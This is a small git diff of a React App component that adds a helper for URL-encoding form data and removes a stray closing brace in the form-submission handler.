@@ -1,7 +1,11 @@
 import { useState } from 'react'
 import fb from './assets/fb.png'
 import './App.css'
-
+const encode = (data) => {
+  return Object.keys(data)
+      .map(key => encodeURIComponent(key) + "=" + encodeURIComponent(data[key]))
+      .join("&");
+}
 function App() {
   const [data, setData] = useState({})
   const handleInput =(e) => {
@@ -49,7 +53,7 @@ function App() {
     e.preventDefault()  // prevent form from refreshing the page on submission  // prevent form from refreshing the page on submission
  
   }
-   }
+   
   }
   return (
     <>
